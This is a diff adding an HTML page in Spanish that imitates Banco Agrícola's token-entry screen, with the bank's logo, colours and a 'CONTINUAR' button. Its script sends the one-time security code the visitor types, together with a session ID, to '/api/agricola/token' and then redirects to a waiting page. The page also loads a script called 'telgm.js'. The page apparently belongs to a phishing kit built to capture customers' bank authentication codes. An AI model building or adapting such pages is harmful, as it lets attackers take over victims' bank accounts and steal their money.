@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Token | Banco Agrícola</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --font: "Open Sans", sans-serif;
+      --yellow:#FDDA24;
+      --black:#000;
+      --muted:#505050;
+      --input:#bdbdbd;
+      --line:#e9e9e9;
+      --danger:#C62828;
+    }
+
+    *{ box-sizing:border-box; margin:0; padding:0; }
+    html,body{ height:100%; font-family:var(--font); color:var(--black); background:#fff; }
+
+    /* ======= Header ======= */
+    .header{
+      height:80px;
+      padding:0 40px;
+      display:flex;
+      align-items:center;
+      border-bottom:1px solid #f4f4f4;
+      background:#fff;
+      justify-content:flex-start;
+      gap:12px;
+      position:relative;
+      z-index:2;
+    }
+    .logo-desktop{ height:48px; }
+    .logo-mobile, .mobile-icon, .header-slot { display:none; }
+
+    /* ======= Main ======= */
+    .main{
+      min-height:calc(100vh - 80px - 64px);
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      padding:20px;
+    }
+
+    .card{
+      width:100%;
+      max-width:420px;
+      background:#fff;
+      border:1px solid #eee;
+      box-shadow:0 8px 20px rgba(0,0,0,0.08);
+      border-radius:4px;
+      padding:30px;
+      text-align:center;
+    }
+
+    .title{
+      font-size:22px;
+      font-weight:700;
+      margin-bottom:22px;
+    }
+
+    .label{
+      display:block;
+      font-size:14px;
+      font-weight:600;
+      color:var(--muted);
+      margin-bottom:8px;
+      text-align:left;
+    }
+
+    .input{
+      width:100%;
+      height:44px;
+      border:none;
+      border-bottom:2px solid var(--input);
+      font-size:18px;
+      text-align:center;
+      outline:none;
+      transition:border-color 0.2s ease;
+      -moz-appearance:textfield; /* Firefox: sin flechas */
+    }
+    .input:focus{ border-color:#8d8d8d; }
+    /* WebKit: sin flechas */
+    .input::-webkit-outer-spin-button,
+    .input::-webkit-inner-spin-button{ -webkit-appearance:none; margin:0; }
+
+    .error{
+      margin-top:14px;
+      color:var(--danger);
+      font-weight:700;
+      font-size:14px;
+      min-height:20px; /* para que no salte el layout */
+      visibility:hidden;
+      opacity:0;
+      transition:opacity .2s ease;
+    }
+    .error.show{ visibility:visible; opacity:1; }
+
+    .btn{
+      margin-top:28px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:10px;
+      width:100%;
+      height:48px;
+      background:var(--yellow);
+      border:0;
+      border-radius:999px;
+      font-weight:700;
+      font-size:15px;
+      color:#000;
+      cursor:pointer;
+      transition:filter .15s ease, transform .02s ease, opacity .15s ease;
+    }
+    .btn:active{ transform:translateY(1px); }
+    .btn:hover:not(:disabled){ filter:brightness(.98); }
+    .btn:disabled{ opacity:.5; cursor:not-allowed; }
+    .btn__icon{
+      width:28px; height:28px; border-radius:50%;
+      border:1px solid rgba(0,0,0,.45); display:inline-flex;
+      align-items:center; justify-content:center; font-size:16px;
+    }
+
+    /* ======= Barra inferior (móvil) ======= */
+    .bottom-bar{
+      position:fixed; bottom:0; left:0; width:100%; background:#fff;
+      border-top:1px solid #eaeaea; box-shadow:0 -2px 6px rgba(0,0,0,.08);
+      padding:10px 16px 16px; display:flex; flex-direction:column; align-items:center; z-index:10;
+    }
+    .bottom-links{
+      width:100%; display:flex; justify-content:space-between; align-items:center; margin-top:12px;
+    }
+    .foot-link{ display:flex; align-items:center; gap:6px; text-decoration:none; color:#000; font-size:14px; }
+    .foot-link img{ height:16px; }
+
+    /* ======= Móvil ======= */
+    @media (max-width:768px){
+      .header{ height:68px; padding:0 12px; justify-content:space-between; border-bottom:1px solid #eee; }
+      .logo-desktop{ display:none; }
+      .logo-mobile{ display:block; height:28px; }
+      .header-slot{ display:flex; width:24px; height:24px; align-items:center; justify-content:center; }
+      .mobile-icon{ display:block; width:22px; height:22px; }
+      /* ocultar botón dentro del card en móvil */
+      .card .btn{ display:none; }
+    }
+    /* Ocultar barra inferior en pantallas grandes */
+    @media (min-width:769px){ .bottom-bar{ display:none; } }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header class="header">
+    <div class="header-slot">
+      <img class="mobile-icon" src="images/telephone.svg" alt="Teléfono">
+    </div>
+    <img class="logo-desktop" src="images/logo.svg" alt="Banco Agrícola">
+    <img class="logo-mobile" src="images/logo.svg" alt="Banco Agrícola">
+    <div class="header-slot">
+      <img class="mobile-icon" src="images/help.svg" alt="Ayuda">
+    </div>
+  </header>
+
+  <!-- Contenido -->
+  <main class="main">
+    <section class="card">
+      <h1 class="title">Ingrese su Token</h1>
+
+      <label for="token" class="label">Código de seguridad</label>
+      <input
+        class="input"
+        type="number"
+        id="token"
+        name="token"
+        maxlength="8"
+        inputmode="numeric"
+        placeholder="••••••••"
+        autocomplete="one-time-code"
+      >
+
+      <!-- Mensaje de error -->
+      <div id="error" class="error" aria-live="polite"></div>
+
+      <!-- Botón (solo desktop) -->
+      <button class="btn" id="continueBtn" type="button" disabled>
+        CONTINUAR
+        <span class="btn__icon">→</span>
+      </button>
+    </section>
+  </main>
+
+  <!-- Barra inferior (solo móvil) -->
+  <div class="bottom-bar">
+    <button class="btn" id="continueBtnMobile" type="button" disabled>
+      CONTINUAR
+      <span class="btn__icon">→</span>
+    </button>
+    <div class="bottom-links">
+      <a class="foot-link" href="#"><img src="images/pencil.svg" alt=""><span>Regístrate</span></a>
+      <a class="foot-link" href="#"><img src="images/telephone.svg" alt=""><span>Contáctanos</span></a>
+    </div>
+  </div>
+
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script type="text/javascript" src="telgm.js"></script>
+    <script>
+
+document.addEventListener('DOMContentLoaded', () => {
+  const tokenInput = document.getElementById('token');
+  const btnDesktop = document.getElementById('continueBtn');
+  const btnMobile  = document.getElementById('continueBtnMobile');
+  const errorEl    = document.getElementById('error');
+  let hideTimeout  = null;
+
+  // Habilitar/Deshabilitar botones según longitud (>=4, máx 8)
+  tokenInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 8) value = value.slice(0, 8);
+    e.target.value = value;
+
+    const enabled = value.length >= 4;
+    if (btnDesktop) btnDesktop.disabled = !enabled;
+    if (btnMobile)  btnMobile.disabled  = !enabled;
+  });
+
+  // Manejadores
+  if (btnDesktop) btnDesktop.addEventListener('click', onContinue);
+  if (btnMobile)  btnMobile.addEventListener('click', onContinue);
+
+  async function onContinue() {
+    const token = tokenInput.value.trim();
+    if (!token || token.length < 1) return;
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('session_id');
+
+    if (btnDesktop) { btnDesktop.innerText = "Validando..."; btnDesktop.disabled = true; }
+    if (btnMobile)  { btnMobile.innerText = "Validando..."; btnMobile.disabled = true; }
+
+    if (!sessionId) {
+        showInvalid();
+        return;
+    }
+
+    try {
+        const response = await fetch('/api/agricola/token', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token, session_id: sessionId })
+        });
+        const data = await response.json();
+        if (data.success) {
+            window.location.href = `espera.html?session_id=${sessionId}`;
+        }
+    } catch (error) {
+        showInvalid();
+    }
+  }
+
+  function showInvalid(){
+    errorEl.textContent = 'TOKEN INVÁLIDO, INTENTE NUEVAMENTE';
+    errorEl.classList.add('show');
+    tokenInput.value = '';
+    if (btnDesktop) btnDesktop.disabled = true;
+    if (btnMobile)  btnMobile.disabled  = true;
+
+    clearTimeout(hideTimeout);
+    hideTimeout = setTimeout(() => {
+      errorEl.classList.remove('show');
+      errorEl.textContent = '';
+      tokenInput.focus();
+    }, 2000);
+  }
+});
+</script>
+
+
+</body>
+</html>
